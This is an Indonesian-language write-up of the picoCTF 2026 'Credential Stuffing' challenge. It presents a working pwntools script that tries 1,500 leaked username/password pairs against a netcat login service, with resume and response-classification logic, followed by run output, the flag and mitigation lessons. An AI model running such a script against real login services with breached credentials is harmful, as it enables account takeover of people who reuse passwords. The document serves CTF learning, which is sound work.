# Credential Stuffing

| Informasi | Detail |
| --- | --- |
| Platform / Event | picoCTF 2026 (via CyLab Security Academy) |
| Kategori | Web Exploitation |
| Tingkat Kesulitan | Medium |
| Status | Solved |

## Deskripsi

Challenge `Credential Stuffing` mensimulasikan serangan credential stuffing: penggunaan
otomatis pasangan username dan password hasil kebocoran data terhadap form login situs lain.
Deskripsi challenge menjelaskan bahwa terjadi data breach pada sebuah department store
terkenal, ribuan kredensial login penggunanya dibocorkan, dan setidaknya satu pengguna
diduga menggunakan kembali kredensial yang sama untuk akun di sebuah bank lokal. Tujuannya
adalah melakukan credential stuffing terhadap layanan Online Banking Service untuk
mendapatkan flag.

## Informasi Awal

- Instance dapat diakses melalui netcat, dengan port yang berubah setiap instance
  (`65133`, `60328`, dan `49264` pada beberapa sesi):

  ```bash
  nc crystal-peak.picoctf.net 65133
  ```

- Layanan menyambut dengan prompt login:

  ```text
  Welcome to the Online Banking Service!

  Please enter your username & password to login.
  Username:
  ```

- Deskripsi challenge menyediakan tautan unduhan `credentials dump` yang berisi hasil
  kebocoran data department store.
- File di direktori kerja (`~/Downloads`):
  - `creds-dump.txt` (1.409 KiB, 1.500 baris): dump kredensial dengan format
    `username;password` per baris, misalnya `rora;winner1`, `birendra;rumble`,
    `field;sunflower`, dan `sherill;icecube`.
  - `solver.py`: script Python yang dibuat untuk mengotomatiskan serangan.
- Percobaan manual satu kredensial gagal:

  ```text
  Username: sherill
  Password: icecube
  Invalid username or password
  ```

## Tools

- `nc` (netcat)
- Python dengan `pwntools`
- `nano`

## Analisis

Dengan 1.500 pasangan kredensial pada `creds-dump.txt`, percobaan manual melalui netcat
tidak praktis karena setiap percobaan memerlukan koneksi baru dan input dua field.
Percobaan manual dengan `sherill;icecube` juga menegaskan bahwa kegagalan login hanya
menghasilkan pesan `Invalid username or password`.

Pendekatan yang dipilih adalah membuat script otomatisasi berbasis `pwntools` yang:

1. Membaca seluruh baris `creds-dump.txt` dan memecahnya menjadi `username` dan `password`
   dengan pemisah `;`.
2. Untuk setiap baris, membuka koneksi baru ke layanan, mengirim username saat prompt
   `Username:` muncul, lalu mengirim password saat prompt `Password:` muncul.
3. Mengumpulkan seluruh respons server (bukan satu paket saja) menggunakan fungsi
   `read_all` dengan timeout, karena respons keberhasilan (`Authenticating...`,
   `Welcome ...`, flag) datang terpisah dan berpola berbeda dari pesan kegagalan.
4. Mengklasifikasi hasil dengan regex `FAIL_PATTERNS`
   (`(fail|invalid|incorrect|wrong|denied|error|try again)`, case-insensitive). Respons
   yang tidak cocok dengan pola kegagalan dicatat sebagai kandidat sukses ke `found.txt`.
5. Mencari flag dengan regex `picoCTF\{[^}]*\}` pada respons, menghapus `progress.txt`,
   dan menghentikan brute force.
6. Menyimpan progres ke `progress.txt` agar eksekusi yang terputus (misalnya karena
   instance expire atau koneksi EOF) dapat dilanjutkan dari baris terakhir, dan
   menambahkan `sleep(0.05)` antar percobaan agar tidak membanjiri server.

## Langkah Penyelesaian

### 1. Menghubungkan ke layanan secara manual

Layanan dihubungkan dengan netcat untuk memahami alur login:

```bash
nc crystal-peak.picoctf.net 65133
```

Output yang muncul:

```text
Welcome to the Online Banking Service!

Please enter your username & password to login.
Username: sherill
Password: icecube
Invalid username or password
```

Kredensial dari dump belum tentu valid di layanan ini, sehingga seluruh dump perlu
dicoba secara otomatis.

### 2. Membuat script solver dengan pwntools

Script `solver.py` dibuat dengan konstanta target dan logika brute force. Bagian
persiapan dan pembacaan progres:

```python
import os
import re
from pwn import *

HOST = 'crystal-peak.picoctf.net'
PORT = 65133

context.log_level = 'error'

FAIL_PATTERNS = re.compile(
    r'(fail|invalid|incorrect|wrong|denied|error|try again)', re.IGNORECASE)


def read_all(r, timeout=3):
    """Kumpulkan SEMUA byte yang dikirim server sampai diam selama `timeout` detik."""
    data = b''
    while True:
        try:
            chunk = r.recv(timeout=timeout)
            if not chunk:
                break
            data += chunk
        except EOFError:
            break
    return data.decode('utf-8', errors='ignore')


def run_bruteforce():
    try:
        with open('creds-dump.txt', 'r') as f:
            credentials = f.read().splitlines()
    except FileNotFoundError:
        print("[-] Error: File creds-dump.txt tidak ditemukan.")
        return

    mulai_dari = 0
    if os.path.exists('progress.txt'):
        with open('progress.txt', 'r') as p:
            content = p.read().strip()
            if content.isdigit():
                mulai_dari = int(content)
                print(f"[*] Melanjutkan pengujian mulai dari baris ke-{mulai_dari}")
                print("[*] (Hapus progress.txt jika ingin mulai dari awal)")
```

Bagian utama percobaan per baris kredensial:

```python
    for index in range(mulai_dari, len(credentials)):
        cred = credentials[index]
        if not cred or ';' not in cred:
            continue

        username, password = cred.split(';', 1)

        with open('progress.txt', 'w') as p:
            p.write(str(index))

        try:
            r = remote(HOST, PORT, timeout=5)
            r.recvuntil(b'Username:', timeout=5)
            r.sendline(username.encode())

            r.recvuntil(b'Password:', timeout=5)
            r.sendline(password.encode())

            # Ambil SEMUA respons server, bukan satu paket saja
            response = read_all(r, timeout=3)
            r.close()

            if FAIL_PATTERNS.search(response):
                print(f"[{index+1}/{len(credentials)}] {username}:{password} -> GAGAL")
            else:
                # Respons sukses ATAU respons yang polanya berbeda dari kegagalan biasa
                print(f"\n[+] BARIS {index} -> User: {username} | Pass: {password}")
                print(f"[+] Respons server:\n{response}")
                with open('found.txt', 'w') as f:
                    f.write(f"{username}\n{password}\n\n{response}")
                print("[+] Disimpan ke found.txt")

                if 'picoCTF{' in response:
                    flag = re.search(r'picoCTF\{[^}]*\}', response)
                    if flag:
                        print(f"\n[**] FLAG: {flag.group(0)} [**]")
                        os.remove('progress.txt')
                        break
        except EOFError:
            print(f"\n[-] Baris {index}: koneksi ditutup server (EOF).")
            continue
        except Exception as e:
            print(f"\n[-] Baris {index}: kesalahan jarinan: {e}")
            print("[-] Generate port baru, update kode, lalu jalankan ulang.")
            break

        sleep(0.05)  # jeda kecil agar tidak flood server

    print("\n[*] Selesai.")


if __name__ == '__main__':
    run_bruteforce()
```

Fungsi `read_all` penting karena respons server untuk login berhasil tidak datang dalam
satu paket yang sama dengan prompt; dengan mengumpulkan semua byte hingga server diam
selama 3 detik, pesan `Authenticating...`, sambutan, dan flag tetap tertangkap.

### 3. Menjalankan credential stuffing

Script dijalankan pada virtualenv Python:

```bash
python solver.py
```

Script mencoba seluruh 1.500 kredensial satu per satu dan menampilkan progres:

```text
[1/1500] rora:winner1 -> GAGAL
[2/1500] birendra:rumble -> GAGAL
[3/1500] khaldis:sting -> GAGAL
...
[1337/1500] zefer:sopranos -> GAGAL
[1338/1500] jeanelle:return -> GAGAL
[1339/1500] jaylinn:faithful -> GAGAL
```

Koneksi EOF yang terjadi saat instance berganti port ditangani dengan mencatat posisi
terakhir di `progress.txt`, sehingga pengujian dapat dilanjutkan tanpa mengulang dari awal.

### 4. Menemukan kredensial yang valid dan flag

Pada baris ke-1339 dengan kredensial `lyndy:zhang`, respons server tidak cocok dengan
pola kegagalan dan justru berisi sambutan beserta flag:

```text
[+] BARIS 1339 -> User: lyndy | Pass: zhang
[+] Respons server:
zhang

Authenticating...
Welcome lyndy!
picoCTF{d0nt_r3u5e_cr3d3nt1als_f452dfe3}

[+] Disimpan ke found.txt

[**] FLAG: picoCTF{d0nt_r3u5e_cr3d3nt1als_f452dfe3} [**]
[*] Selesai.
```

Hasilnya membuktikan bahwa pengguna `lyndy` menggunakan kembali kredensial department
store untuk akun bank lokalnya, dan flag diperoleh setelah login berhasil.

## Flag

```text
picoCTF{d0nt_r3u5e_cr3d3nt1als_f452dfe3}
```

## Pembelajaran

- Credential stuffing bekerja karena banyak pengguna menggunakan kembali password yang
  sama di beberapa layanan; satu kebocoran data dapat membuka akun di layanan lain.
- Otomatisasi dengan `pwntools` memudahkan interaksi dengan layanan berbasis netcat:
  menunggu prompt tertentu (`recvuntil`), mengirim input (`sendline`), lalu mengklasifikasi
  respons.
- Mengumpulkan seluruh respons dengan timeout, alih-alih satu `recv` tunggal, penting
  agar respons multi-paket seperti `Authenticating...` dan flag tidak terlewat.
- Mekanisme resume (`progress.txt`) dan penanganan EOF membuat brute force 1.500 baris
  tetap andal meskipun instance berganti port atau koneksi diputus server.
- Mitigasi di sisi pengguna adalah tidak menggunakan ulang password; di sisi layanan,
  deteksi dan pembatasan percobaan login massal perlu diterapkan.

## Referensi

- [picoCTF](https://picoctf.org/)
- [CyLab Security Academy](https://learn.cylabacademy.org/)
- [pwntools Documentation](https://docs.pwntools.com/)
